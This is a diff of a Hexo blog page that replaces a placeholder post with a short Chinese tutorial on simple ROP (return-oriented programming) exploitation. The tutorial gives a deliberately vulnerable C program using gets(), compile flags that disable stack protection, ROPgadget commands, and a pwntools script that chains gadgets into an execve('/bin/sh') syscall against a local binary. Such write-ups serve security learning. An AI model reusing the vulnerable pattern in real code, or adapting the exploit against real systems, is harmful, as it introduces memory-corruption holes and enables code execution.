@@ -3,20 +3,19 @@
 <head>
   <meta charset="utf-8">
   
-  <title>My First Hexo Blog | JXF</title>
+  <title>简单ROP | JXF</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="This is my first blog.">
-<meta name="keywords" content="jxf,qff">
+  <meta name="description" content="源码1234567891011121314#include&amp;lt;stdio.h&amp;gt;#include&amp;lt;string.h&amp;gt;int c()&amp;#123;	char buf[100];	gets(buf);	puts(buf);	&amp;#125;int main()&amp;#123;	c();&amp;#125;  并没有开aslr 和其他保护分析 利用gcc生成32位的可bufferflow的.elf文件">
 <meta property="og:type" content="article">
-<meta property="og:title" content="My First Hexo Blog">
-<meta property="og:url" content="http://yoursite.com/2018/06/30/My-First-Hexo-Blog/index.html">
+<meta property="og:title" content="简单ROP">
+<meta property="og:url" content="http://yoursite.com/2018/10/07/简单ROP/index.html">
 <meta property="og:site_name" content="JXF">
-<meta property="og:description" content="This is my first blog.">
+<meta property="og:description" content="源码1234567891011121314#include&amp;lt;stdio.h&amp;gt;#include&amp;lt;string.h&amp;gt;int c()&amp;#123;	char buf[100];	gets(buf);	puts(buf);	&amp;#125;int main()&amp;#123;	c();&amp;#125;  并没有开aslr 和其他保护分析 利用gcc生成32位的可bufferflow的.elf文件">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-06-30T15:06:44.259Z">
+<meta property="og:updated_time" content="2018-10-07T09:12:53.359Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="My First Hexo Blog">
-<meta name="twitter:description" content="This is my first blog.">
+<meta name="twitter:title" content="简单ROP">
+<meta name="twitter:description" content="源码1234567891011121314#include&amp;lt;stdio.h&amp;gt;#include&amp;lt;string.h&amp;gt;int c()&amp;#123;	char buf[100];	gets(buf);	puts(buf);	&amp;#125;int main()&amp;#123;	c();&amp;#125;  并没有开aslr 和其他保护分析 利用gcc生成32位的可bufferflow的.elf文件">
   
     <link rel="alternative" href="/atom.xml" title="JXF" type="application/atom+xml">
   
@@ -230,11 +229,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-My-First-Hexo-Blog" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-简单ROP" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/06/30/My-First-Hexo-Blog/" class="article-date">
-      <time datetime="2018-06-30T15:04:57.000Z" itemprop="datePublished">2018-06-30</time>
+      <a href="/2018/10/07/简单ROP/" class="article-date">
+      <time datetime="2018-10-07T08:54:01.000Z" itemprop="datePublished">2018-10-07</time>
 </a>
     </div>
   
@@ -247,7 +246,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      My First Hexo Blog
+      简单ROP
     </h1>
   
 
@@ -257,10 +256,6 @@
         
 
         
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jxf/">jxf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/qff/">qff</a></li></ul>
-    </div>
-
         <div class="clearfix"></div>
       </div>
       
@@ -268,9 +263,20 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>This is my first blog.</p>
-<a id="more"></a>
-<p>sb.</p>
+        <h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int c()</span><br><span class="line">&#123;</span><br><span class="line">	char buf[100];</span><br><span class="line">	gets(buf);</span><br><span class="line">	puts(buf);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	c();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>并没有开aslr 和其他保护<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2></li>
+<li>利用gcc生成32位的可bufferflow的.elf文件</li>
+<li>接着利用ROPgadget –binary 来寻找gadget</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./Demo2&quot;)</span><br><span class="line">par=0x080b7f86</span><br><span class="line">pcr=0x080de66d</span><br><span class="line">pbdr=0x0806edd9</span><br><span class="line">binsh=0xffffce8c</span><br><span class="line">int0x80=0x80b6c98</span><br><span class="line">offset=112</span><br><span class="line">payload=&apos;/bin/sh&apos;.ljust(offset)+p32(par)+p32(11)+p32(pbdr)+p32(binsh)+p32(0)+p32(pcr)+p32(0)+p32(int0x80)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>其中寻找/bin/sh的值可以用searchmem来找到</li>
+</ul>
+<ul>
+<li>生成静态 无栈保护 32位文件例子 gcc -g  Demo2.c -o Demo2  -fno-stack-protector -m32 -static</li>
+<li>ROPgadget –binary Demo2 &gt; gadgets –depth 20 （默认深度10）</li>
+</ul>
 
       
       
@@ -326,13 +332,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/06/30/My-First-Hexo-Blog/">My First Hexo Blog</a></p>
+        <p><span>本文标题:</span><a href="/2018/10/07/简单ROP/">简单ROP</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Fake Student 的个人博客">Fake Student</a></p>
-        <p><span>发布时间:</span>2018年06月30日 - 23时04分</p>
-        <p><span>最后更新:</span>2018年06月30日 - 23时06分</p>
+        <p><span>发布时间:</span>2018年10月07日 - 16时54分</p>
+        <p><span>最后更新:</span>2018年10月07日 - 17时12分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/06/30/My-First-Hexo-Blog/" title="My First Hexo Blog">http://yoursite.com/2018/06/30/My-First-Hexo-Blog/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/06/30/My-First-Hexo-Blog/　　作者: Fake Student" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/10/07/简单ROP/" title="简单ROP">http://yoursite.com/2018/10/07/简单ROP/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/07/简单ROP/　　作者: Fake Student" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -345,18 +351,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2018/07/01/爬坑之路--BIN(一)--1/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/10/30/linux-远程连接/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          爬坑之路--BIN(一)--1.md
+          linux 远程连接
         
       </div>
     </a>
   
   
-    <a href="/2018/06/30/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hello World</div>
+    <a href="/2018/09/19/believeme/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">believeme</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -367,7 +373,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#源码"><span class="toc-number">1.</span> <span class="toc-text">源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -433,13 +439,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/07/01/爬坑之路--BIN(一)--1/" title="上一篇: 爬坑之路--BIN(一)--1.md">
+            <a href="/2018/10/30/linux-远程连接/" title="上一篇: linux 远程连接">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2018/06/30/hello-world/" title="下一篇: Hello World">
+            <a href="/2018/09/19/believeme/" title="下一篇: believeme">
                 <i class="fa fa-angle-right"></i>
             </a>
         
